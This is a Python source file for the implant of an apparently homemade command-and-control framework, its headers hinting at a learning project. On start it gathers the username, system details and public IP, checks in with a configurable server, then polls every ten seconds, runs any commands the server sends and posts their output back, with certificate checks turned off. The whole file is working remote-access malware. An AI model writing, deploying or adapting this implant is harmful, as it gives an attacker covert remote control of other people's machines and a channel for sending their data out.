import requests
import json
from time import sleep
import subprocess
import sys
import random
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) ## this is to disable ssl warnings
class Agent(object):

	url = "https://127.0.0.1:9000/" ## gets edited by agent creation
	random_num = random.randint(1000,90000)
	user_result = subprocess.run(["whoami"],capture_output=True).stdout.decode("utf-8").rstrip()
	os_result = subprocess.run(["uname","-a"],capture_output=True).stdout.decode("utf-8").rstrip()
	ip_result = subprocess.run(["curl","ipinfo.io/ip"],capture_output=True).stdout.decode("utf-8").rstrip()
	payload = {"agent_id":"{}".format(random_num),"os":"{}".format(os_result),"ip":"{}".format(ip_result),"user":"{}".format(user_result),"completed_commands":[],"pending_commands":[]}
	payload = json.dumps(payload)
	headers = {
	  'User-Agent': 'QmxhY2tUYWJieQo=',
	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK',
	  'Content-Type': 'application/json'
	}
#20 & 21 get edited by agent creation
	

	def first_checkin(self):
		url = self.url + 'first_check_in'
		self.response = requests.request("POST",url,headers=self.headers,data = self.payload,verify=False)
		self.response_json = self.response.json()
		self.doc_id = self.response_json['id']
		self.rev_num = self.response_json['rev']
		self.access_token = self.response_json['token']
		self.refresh_token = self.response_json['refresh']
		return

	def check(self):
		url = self.url + "poll"
		headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
		response = requests.request("GET",url,headers=headers,verify=False)
		response_json = dict(response.json())
		self.updated_payload = response_json
		if response_json['pending_commands']: 
			self.cmd = response_json['pending_commands'][0]
			cmd_split = self.cmd.split(" ")
			try:
				result = subprocess.run(cmd_split,capture_output=True)
				self.cmd_result = {self.cmd:result.stdout.decode("utf-8").rstrip()}
				try:
					### Requesting new token ###
					refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
					resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
					resp = resp.json()
					self.access_token = resp['token'] ## new token
					return True
				except:
					return False
			except:
				self.cmd_result = {self.cmd:"Error running command"}
				return True
		else:
			### Requesting new token ###
			refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
			resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
			resp = resp.json()
			self.access_token = resp['token'] ## new token
			return False


	def post_complete_command(self):
		url = self.url + "poll"
		self.updated_payload['pending_commands'].remove(self.cmd) ## removes pending command[0] 
		self.updated_payload['completed_commands'].append(self.cmd_result)
		headers = {"Content-Type":"application/json","doc_id":self.doc_id, "Authorization":"Bearer {}".format(self.access_token)}
		response = requests.request("POST",url,headers=headers,data=json.dumps(self.updated_payload),verify=False,)


	def refresh_token(self):
		refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
		refresh_url = self.url + "refresh"
		resp = requests.request("GET",refresh_url,headers=refresh_header,verify=False,)
		resp_json = resp.json()
		return resp_json['token']


	def main(self):
		agent = Agent()
		agent.first_checkin()
		while True:
			sleep(10)
			if agent.check():
				agent.post_complete_command()
			else:
				sleep(1)

if __name__ == "__main__":
    Agent().main()